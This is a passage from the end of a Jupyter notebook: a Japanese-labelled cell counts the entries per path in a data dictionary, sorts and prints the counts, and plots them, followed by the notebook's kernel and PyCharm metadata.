   "source": [
    "↓パスごとの統計結果"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "counts = []\n",
    "for s, d in dataS.items():\n",
    "    counts.append(len(d))\n",
    "counts = sorted(counts, reverse=True)\n",
    "print(counts)\n",
    "signatureRoundGraph(keys=None, data=counts)"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  },
  "pycharm": {
   "stem_cell": {
    "cell_type": "raw",
    "source": [
     "from IPython.display import set_matplotlib_for"
    ],
    "metadata": {
     "collapsed": false
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}